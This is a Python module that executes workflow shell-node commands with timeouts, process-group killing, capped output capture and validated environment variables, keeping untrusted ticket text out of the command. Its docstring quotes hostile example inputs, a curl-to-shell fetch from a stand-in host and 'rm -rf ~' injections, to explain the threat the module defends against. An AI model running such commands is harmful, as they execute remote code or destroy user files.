"""Run one deterministic command for a governed-workflow shell node.

No AI is involved (PRD §8.4). The command text comes from the workflow
file — a reviewed, checked-in artifact — and nothing else is ever spliced
into it.

**Why ticket data and prior node output never reach `command`.**
A shell node's command is passed to `bash -lc`, so any text interpolated
into it is *executed*, not read. Ticket titles, descriptions, labels, and
the output of an upstream agent node are all attacker-influenced: a
description containing ``$(curl evil.sh | sh)`` or ``"; rm -rf ~`` would
run with the operator's credentials in a workspace that has write access
to the host repository's git object database. PRD §8.6 therefore states
that "shell command text does not support raw ticket/output substitution",
§8.4 requires that such data be "passed through environment variables or
files, not interpolated unescaped into the shell command", and §21.2
requires that untrusted ticket text never be interpolated directly into
shell commands.

This module enforces that structurally rather than by convention: there
is no substitution step and no parameter that could carry one. Dynamic
data arrives only via `env_extra`, which becomes environment variables.
An environment value is inert — bash assigns it, it is never re-parsed —
so ``FOO='$(rm -rf ~)'`` is just a nine-character string to the child. The
*names* are validated (``^[A-Z][A-Z0-9_]*$``) because a name is not inert:
a crafted key could shadow ``PATH``/``LD_PRELOAD``-style variables through
lowercase or punctuation smuggling, or inject a second assignment. Values
pass through byte-for-byte, except that a NUL is rejected — `execve` would
silently truncate the variable there, so accepting one would mean the
child sees something different from what the caller asked for.

Timeouts do not raise. The caller (`flow/retries.py` and the executor)
decides what a timeout means for this node; our job is to kill the whole
process group and hand back whatever the command managed to say first.
"""

from __future__ import annotations

import asyncio
import os
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Mapping

from .._shell import resolve_bash, safe_proc_wait, terminate_process_tree
from ..errors import ConfigValidationError, PortExit
from ..utils.git_sandbox import git_roots_env


# PRD §8.4: preview is capped at 32 KiB per stream.
PREVIEW_LIMIT_BYTES = 32 * 1024
# Hard ceiling on retained output per stream. The full text is held in
# memory until the artifact writer persists it, and a runaway command
# (`yes`, a debug-logging test run) can emit gigabytes.
STREAM_LIMIT_BYTES = 8 * 1024 * 1024
# StreamReader buffer for the subprocess pipes; matches backends/per_turn.py.
MAX_LINE_BYTES = 10 * 1024 * 1024
_READ_CHUNK_BYTES = 64 * 1024
# After killing a timed-out process group, the pipes reach EOF almost
# immediately. This bounds the wait for the readers to pick up the last
# buffered bytes so a timeout still returns promptly.
_POST_KILL_DRAIN_SECONDS = 2.0

_ENV_KEY_RE = re.compile(r"^[A-Z][A-Z0-9_]*$")

_STREAM_TRUNCATED = (
    "\n[symphony] output truncated: retained first {kept} bytes, "
    "dropped {dropped} more"
)
_PREVIEW_ELIDED = "[symphony] preview truncated: showing last {kept} bytes\n"


@dataclass(frozen=True)
class ShellNodeResult:
    """Outcome of one shell node attempt. A timeout is data, not an error."""

    exit_code: int
    stdout: str
    stderr: str
    stdout_preview: str
    stderr_preview: str
    timed_out: bool


async def run_shell_node(
    *,
    command: str,
    workspace: Path,
    timeout_seconds: int,
    env_extra: Mapping[str, str] | None = None,
) -> ShellNodeResult:
    """Execute `command` in `workspace` and capture its output.

    Raises `ConfigValidationError` when `env_extra` carries a key that is
    not a plain uppercase environment name or a value containing NUL, and
    `PortExit` when bash itself cannot be spawned. Every other outcome —
    including a nonzero exit and a timeout — is reported in the result.
    """
    env = _build_env(workspace, env_extra)

    try:
        proc = await asyncio.create_subprocess_exec(
            resolve_bash(),
            "-lc",
            command,
            cwd=str(workspace),
            # A shell node is non-interactive: a command that reads stdin
            # must see EOF rather than inherit (and block on) our terminal.
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
            limit=MAX_LINE_BYTES,
            # Own process group so a cancel or timeout reaches the real
            # command behind the bash wrapper, plus anything it spawned
            # (PRD §8.4: "cancellation terminates the process group").
            start_new_session=os.name == "posix",
        )
    except FileNotFoundError as exc:
        raise PortExit("bash not available", error=str(exc)) from exc

    assert proc.stdout is not None and proc.stderr is not None
    out = _StreamCollector()
    err = _StreamCollector()
    # Both pipes are drained concurrently. Reading them in sequence would
    # deadlock: a command that fills the stderr pipe buffer blocks on write
    # while we are still waiting for stdout to reach EOF, which it never
    # will because the child is blocked.
    out_task = asyncio.create_task(out.drain(proc.stdout))
    err_task = asyncio.create_task(err.drain(proc.stderr))
    wait_task = asyncio.create_task(safe_proc_wait(proc))

    timed_out = False
    killed_rc: int | None = None
    try:
        _, pending = await asyncio.wait(
            {out_task, err_task, wait_task}, timeout=float(timeout_seconds)
        )
        if pending:
            timed_out = True
            killed_rc = await terminate_process_tree(proc)
            # The collectors live outside the tasks, so anything already
            # read is safe even if these never finish.
            await asyncio.wait({out_task, err_task}, timeout=_POST_KILL_DRAIN_SECONDS)
    finally:
        for task in (out_task, err_task, wait_task):
            task.cancel()

    stdout_text, stdout_preview = out.render()
    stderr_text, stderr_preview = err.render()
    return ShellNodeResult(
        exit_code=_exit_code(proc, _task_value(wait_task), killed_rc),
        stdout=stdout_text,
        stderr=stderr_text,
        stdout_preview=stdout_preview,
        stderr_preview=stderr_preview,
        timed_out=timed_out,
    )


def _build_env(workspace: Path, env_extra: Mapping[str, str] | None) -> dict[str, str]:
    """Process env + git sandbox grants + validated caller variables.

    `git_roots_env` is what lets `git add` inside a linked-worktree
    workspace write to the host repo's shared object database; without it
    a shell node running `git commit` fails with "failed to insert into
    database". `env_extra` is applied last so a workflow can override, but
    only through names that passed validation.
    """
    env: dict[str, str] = {**os.environ, **git_roots_env(workspace)}
    for key, value in (env_extra or {}).items():
        if not isinstance(key, str) or not _ENV_KEY_RE.fullmatch(key):
            raise ConfigValidationError(
                "shell node env key must match ^[A-Z][A-Z0-9_]*$", key=repr(key)
            )
        if not isinstance(value, str):
            raise ConfigValidationError(
                "shell node env value must be a string", key=key
            )
        if "\x00" in value:
            # execve truncates at NUL; silently shipping a shorter value
            # than the caller asked for is worse than refusing.
            raise ConfigValidationError(
                "shell node env value must not contain NUL", key=key
            )
        env[key] = value
    return env


def _task_value(task: "asyncio.Task[int | None]") -> int | None:
    """Result of a task that may have been cancelled or raised."""
    if not task.done() or task.cancelled():
        return None
    return None if task.exception() is not None else task.result()


def _exit_code(
    proc: asyncio.subprocess.Process, reaped: int | None, killed_rc: int | None
) -> int:
    """Real exit status, preferring the value `safe_proc_wait` observed.

    `proc.returncode` is checked LAST, not first. `safe_proc_wait` reaps
    through `os.waitpid` in a worker thread precisely because the asyncio
    child watcher can miss SIGCHLD; when our thread wins that race the
    watcher logs "Unknown child process pid N, will report returncode 255"
    and stamps `proc.returncode = 255`. Trusting that would turn every
    `exit 7` into a 255 and mislead `classify_failure`. This ordering
    matches `backends/per_turn.py:275`.
    """
    if reaped is not None:
        return reaped
    if killed_rc is not None:
        return killed_rc
    if proc.returncode is not None:
        return proc.returncode
    # Unreapable child. A negative code routes through `classify_failure`
    # as `unknown` rather than `validation` — the honest answer, since we
    # never learned what the command itself decided.
    return -1


class _StreamCollector:
    """Bounded reader for one pipe; survives cancellation of its task."""

    def __init__(self) -> None:
        self._buf = bytearray()
        self._dropped = 0

    async def drain(self, reader: asyncio.StreamReader) -> None:
        while True:
            chunk = await reader.read(_READ_CHUNK_BYTES)
            if not chunk:
                return
            room = STREAM_LIMIT_BYTES - len(self._buf)
            if room > 0:
                self._buf += chunk[:room]
            # Past the cap we keep reading and discarding: stopping here
            # would fill the pipe buffer and wedge the child mid-write.
            self._dropped += max(0, len(chunk) - max(room, 0))

    def render(self) -> tuple[str, str]:
        """Return `(full_text, tail_preview)`, both decoded and marked.

        The preview is the LAST 32 KiB rather than the first: a failing
        test run puts its summary at the end, and a head preview of a
        verbose build shows nothing but setup noise. When the stream also
        hit the 8 MiB cap, the cap marker is appended to the text *before*
        the tail is taken, so it always lands inside the preview — the
        reader is never shown a "tail" without being told it is really the
        tail of a truncated middle.
        """
        text = self._buf.decode("utf-8", errors="replace")
        if self._dropped:
            text += _STREAM_TRUNCATED.format(kept=len(self._buf), dropped=self._dropped)
        encoded = text.encode("utf-8")
        if len(encoded) <= PREVIEW_LIMIT_BYTES:
            return text, text
        tail = encoded[-PREVIEW_LIMIT_BYTES:].decode("utf-8", errors="replace")
        return text, _PREVIEW_ELIDED.format(kept=PREVIEW_LIMIT_BYTES) + tail
